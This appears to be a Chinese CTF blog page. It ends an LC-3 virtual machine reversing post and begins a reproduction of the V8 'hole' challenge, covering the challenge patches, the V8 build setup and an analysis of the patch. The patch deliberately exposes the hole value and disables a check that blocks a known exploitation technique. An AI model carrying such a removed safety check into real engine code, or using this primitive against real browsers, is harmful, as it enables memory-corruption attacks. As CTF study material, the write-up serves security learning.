ADD(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_AND:</span><br><span class="line">                AND(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_NOT:</span><br><span class="line">                NOT(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_BR:</span><br><span class="line">                BR(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JMP:</span><br><span class="line">                JMP(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JSR:</span><br><span class="line">                JSR(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LD:</span><br><span class="line">                LD(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDI:</span><br><span class="line">                LDI(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDR:</span><br><span class="line">                LDR(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LEA:</span><br><span class="line">                LEA(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_ST:</span><br><span class="line">                ST(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STI:</span><br><span class="line">                STI(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STR:</span><br><span class="line">                STR(instr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_TRAP:</span><br><span class="line">                TRAP(instr,&amp;running);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_RES:</span><br><span class="line">            <span class="keyword">case</span> OP_RTI:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">abort</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    restore_input_buffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试编译该代码并运行目标程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  vm gcc lc3.c -o lc3-vm</span><br><span class="line">➜  vm ./lc3-vm ./2048.obj</span><br><span class="line">Control the game using WASD keys.</span><br><span class="line">Are you on an ANSI terminal (y/n)? n</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|         2                |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|                     2    |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure>
<p><strong>Reverse the VM 逆向虚拟机</strong></p>
<p>此虚拟机被编译为了3个版本：</p>
<ul>
<li>正常版本</li>
<li>debug 版本</li>
<li>去符号版本</li>
</ul>
<p>正常版本和 debug 版本只有一些全局变量的差别：</p>
<img src="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/1670172904114.png" class width="1670172904114"> 
<p>去符号版本的逆向难度要大一些：</p>
<img src="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/1670173037000.png" class width="1670173037000"> 
<p>总体的逆向思路就是：</p>
<ul>
<li>先找到 Switch-Case 循环，并确定每条指令的长度</li>
<li>找到存放寄存器的全局变量，判断各个寄存器个数/位置/功能</li>
<li>分析 Switch-Case 的各个分支，弄懂大概的功能，并了解指令中各个位的用途</li>
</ul>
<p>在 VM pwn 中要多多注意带有 Read/Write 的指令（重点看有没有溢出）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/" class="post-title-link" itemprop="url">V8环境搭建+JavaScript pwn+hole attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-02 18:44:57 / Modified: 18:46:46" itemprop="dateCreated datePublished" datetime="2022-12-02T18:44:57+08:00">2022-12-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>35k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>32 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>hole 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There<span class="number">&#x27;</span>s a hole in the program ?</span><br><span class="line"></span><br><span class="line">Well I<span class="number">&#x27;</span>m sure it<span class="number">&#x27;</span>s <span class="keyword">not</span> that of a big deal, after all it<span class="number">&#x27;</span>s just a small hole that won<span class="number">&#x27;</span>t <span class="keyword">do</span> any damage right ?</span><br><span class="line"></span><br><span class="line">... Right 😨 ?</span><br></pre></td></tr></table></figure>
<ul>
<li>提示信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hole cat README.txt   </span><br><span class="line">* Based on git commit hash: <span class="number">63</span>cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">* args.gn:</span><br><span class="line">dcheck_always_on = <span class="literal">false</span>                                                                                                                                          </span><br><span class="line">is_debug = <span class="literal">false</span></span><br><span class="line">target_cpu = <span class="string">&quot;x64&quot;</span></span><br><span class="line">v8_enable_sandbox = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">* It is recommended that you solve <span class="keyword">this</span> challenge on a Debian Linux <span class="number">11.5</span><span class="number">.0</span> machine.% </span><br></pre></td></tr></table></figure>
<ul>
<li>两个 patch 文件如下：</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 6e0cd408e7..aafdfb8544 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -395,6 +395,12 @@</span> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayHole)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).the_hole_value();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">index 78b0229011..55aaaa03df 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="meta">@@ -1763,7 +1763,7 @@</span> TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          &quot;Map.prototype.delete&quot;);</span><br><span class="line"> </span><br><span class="line">   // This check breaks a known exploitation technique. See crbug.com/1263462</span><br><span class="line"><span class="deletion">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"><span class="addition">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   const TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0e98586f7f..28a46f2856 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -413,6 +413,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \</span><br><span class="line"><span class="addition">+  CPP(ArrayHole)                                                               \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index 79bdfbddcf..c42ad4c789 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1722,6 +1722,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtin::kArrayHole:</span></span><br><span class="line"><span class="addition">+      return Type::Oddball();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtin::kArrayBufferIsView:</span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 9040e95202..a77333287a 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1800,6 +1800,7 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtin::kArrayPrototypeFindIndex, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;lastIndexOf&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeLastIndexOf, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;hole&quot;, Builtin::kArrayHole, 0, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;pop&quot;, Builtin::kArrayPrototypePop,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br></pre></td></tr></table></figure>
<ul>
<li>注册了目标方法，并且给出了一个网页 <code>crbug.com/1263462</code></li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8-posix.cc b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">index c2571ef3a01..e4f27cfdca6 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="meta">@@ -734,6 +734,7 @@</span> char* Shell::ReadCharsFromTcpPort(const char* name, int* size_out) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line"><span class="addition">+/*    </span></span><br><span class="line">   if (options.enable_os_system) &#123;</span><br><span class="line">     os_templ-&gt;Set(isolate, &quot;system&quot;, FunctionTemplate::New(isolate, System));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">@@ -748,6 +749,7 @@</span> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line">                 FunctionTemplate::New(isolate, MakeDirectory));</span><br><span class="line">   os_templ-&gt;Set(isolate, &quot;rmdir&quot;,</span><br><span class="line">                 FunctionTemplate::New(isolate, RemoveDirectory));</span><br><span class="line"><span class="addition">+*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;  // namespace v8</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index c6bacaa732f..63b3c9c27e8 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3266,6 +3266,7 @@</span> static void AccessIndexedEnumerator(const PropertyCallbackInfo&lt;Array&gt;&amp; info) &#123;&#125;</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line"><span class="meta">@@ -3284,6 +3285,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line"><span class="meta">@@ -3456,6 +3458,7 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateSnapshotTemplate(Isolate* isolate) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; d8_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   &#123;</span><br><span class="line">     Local&lt;ObjectTemplate&gt; file_template = ObjectTemplate::New(isolate);</span><br><span class="line">     file_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line"><span class="meta">@@ -3538,6 +3541,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">                               Local&lt;Signature&gt;(), 1));</span><br><span class="line">     d8_template-&gt;Set(isolate, &quot;serializer&quot;, serializer_template);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   return d8_template;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注释了部分源码（<code>system</code> 没了）</li>
</ul>
<p><strong>环境搭建</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">git checkout 63cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">git apply add_hole.patch</span><br></pre></td></tr></table></figure>
<p>在 v8 引擎的6.5版本以上，google 采用了 <code>GN+Ninja</code> 的编译组合，因此需要以下工具来安装依赖：</p>
<p>安装 depot_tools 工具集：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure>
<ul>
<li>然后将 <code>depot_tools</code> 加入你的 <code>PATH</code> 环境变量中（其实也可以不添加）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/profile.d/yhellow.sh</span><br><span class="line">---------------------------------------</span><br><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>取得 <code>depot_tools</code> 之后，需要取得大量编译依赖，google 提供了一个比较方便的工具 <code>gclient</code> 来获取依赖</li>
<li>然后在 V8 的目录中执行以下代码安装依赖：（注意：V8 的路径不能有中文）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br><span class="line">gclient config https://webrtc.googlesource.com/src.git # 最好加上这个,不然会很慢</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
<p>初始化以及编译：</p>
<ul>
<li>v8 使用 <code>Ninja</code> 作为编译工具，同时使用 <code>GN</code> 来生成 <code>.ninja</code> 文件</li>
<li>使用 <code>v8gen</code> 可以生成不同平台的编译配置文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure>
<p>在 <code>out.gn/x64.release/args.gn</code> 中添加如下命令：（增添调试信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">symbol_level = <span class="number">2</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>ninja</code> 开始编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C ./out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>可以用 <code>find</code> 命令来查找可执行文件的位置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  v8 git:(63cb7fb817) ✗ find ./ -name d8 -type f</span><br></pre></td></tr></table></figure>
<p>另外，V8还给 GDB 提供了一些工具，可以把以下这行命令添加到 GDB 的 <code>.gdbinit</code> 中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/yhellow/tools/v8/v8/tools/gdbinit</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://chenquan.me/posts/how-to-compile-v8-engine-by-gn/">如何用GN编译V8引擎</a> </p>
<p><strong>patch 分析</strong></p>
<p>第2个 patch 就是注释了源码的一些功能（暂时不用管）</p>
<p>第1个 patch 应该就是漏洞利用的关键了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> Builtin::kArrayHole:</span><br><span class="line">  <span class="keyword">return</span> Type::Oddball();</span><br></pre></td></tr></table></figure>
<ul>
<li>这里规定 <code>Builtin::kArrayHole</code> 返回一个 <code>Oddball</code> 引用类型</li>
<li><code>oddball</code> 是数据类型的引用，表示在 V8 中怎么调用相关类型（<code>null undefined true false</code> 合称为 <code>oddball</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleInstallFunction(isolate_, proto, <span class="string">&quot;hole&quot;</span>, Builtin::kArrayHole, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>SimpleInstallFunction</code> 每执行一次就安装一个 API 到 <code>isolate_</code> 中 </li>
<li>这里相当于把符号 “hole” 和函数 <code>Builtin::kArrayHole</code> 绑定到一起了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 patch 中注释了一个 <code>CSA_CHECK</code></li>
<li>CodeStubAssembler，V8 的一个组件，该组件定义了一种在 TurboFan 后端构建的可移植汇编语言</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayHole)&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">1</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    <span class="keyword">return</span> ReadOnlyRoots(isolate).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>为 <code>Array</code> 定义了一个 <code>Hole</code> 方法，获取 <code>Hole</code> 方法的参数<ul>
<li>当参数个数大于“1”时，返回 <code>undefined_value</code> 未知类型</li>
<li>当参数个数不大于“1”时，返回 <code>Type::Oddball()</code> 引用类型</li>
</ul>
</li>
<li>Built-in Functions（Builtin）作为V8的内建功能，实现了很多重要功能</li>
<li>Builtin 是编译好的内置代码块（chunk），存储在 <code>snapshot_blob.bin</code> 文件中，V8 启动时以反序列化方式加载，运行时可以直接调用 </li>
</ul>
<p>简单来说，<code>Hole</code> 方法就是返回一个 <code>Oddball</code> 引用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c.hole()))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hole ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line">object</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
<p>先学习这篇文章，了解 V8 的相关知识和常用利用手段：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">利用 v8：*CTF 2019 oob-v8 (faraz.faith)</a> </li>
</ul>
<p><strong>标记指针 Tagged Pointer</strong></p>
<p>Tagged Pointer 是一个指针（内存地址），它具有与其关联的附加数据：</p>
<ul>
<li>大多数体系结构都是字节可寻址的（最小的可寻址单元是字节），但是某些类型的数据通常会与数据的大小对齐，这种差异使指针的一些最低有效位未被使用，它们可以用于标签-通常用作位字段（每个位是一个单独的标签），只要使用该指针的代码在访问前将这些位屏蔽掉即可</li>
<li>相反，在某些操作系统中，虚拟地址的宽度比整个体系结构的宽度窄，从而使最高有效位可用于标签（注意，某些处理器特别禁止在处理器级别使用此类标记指针，尤其是 x86-64，这要求操作系统使用规范形式的地址，且最高有效位全为0或全为1）</li>
</ul>
<p><strong>JS 对象内存信息布局</strong></p>
<p>可以直接使用 GDB 来查看内存布局：</p>
